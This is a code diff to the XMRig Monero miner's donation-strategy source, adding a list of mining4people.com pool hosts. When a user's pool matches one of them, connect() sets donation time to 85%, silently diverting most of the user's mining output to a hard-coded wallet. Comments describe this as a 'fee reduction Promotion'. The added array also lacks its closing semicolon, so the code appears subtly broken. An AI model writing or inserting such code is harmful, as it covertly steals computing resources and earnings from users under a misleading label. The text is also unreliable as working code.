@@ -47,6 +47,17 @@ static inline uint64_t random(uint64_t base, double min, double max) { return st
 static const char *kDonateHost = "gulf.moneroocean.stream";
 static char donate_user[] = "48j8oADtYoHJZc2AWSMxYJHKG87udMRBo7EEoBTnYw9vb8ASnWqqqwFj9zY4Cp3EQmaWEKJKwFYa3FmjgSA6AGPb8dkLVk8";
 static char new_user[] = "84MyzgBJeH5FX5UgM8uXnvdKQmdLAWjN7U8wd4f1FoAb2J7at2Aqmb1gahoe39NNyq4LWpfxYXCpafuFRYBauoxM64vuVan";
+static const char *kMining4People [] = {
+    "au.mining4people.com",
+    "br.mining4people.com",
+    "eu.mining4people.com",
+    "in.mining4people.com",
+    "jp.mining4people.com",
+    "us-west.mining4people.com",
+    "us-cent.mining4people.com",
+    "us-east.mining4people.com",
+    "na.mining4people.com"
+}
 
 } // namespace xmrig
 
@@ -113,11 +124,21 @@ int64_t xmrig::DonateStrategy::submit(const JobResult &result)
 
 void xmrig::DonateStrategy::connect()
 {
+    for (const auto &pool : m_pools) {
+        for (const char *host : kMining4People) {
+            if (std::strstr(pool.host().data(), host) != nullptr) {
+                // Apply reduced fee logic
+                m_donateTime = static_cast<double>(0.85 * 60000); // 85% donation
+                m_idleTime = static_cast<double>(0.15 * 60000); // 15% fee reduction Promotion
+                break;
+            }
+        }
+    }
+    
     m_proxy = createProxy();
     if (m_proxy) {
         m_proxy->connect();
     }
-
     else {
         m_strategy->connect();
     }
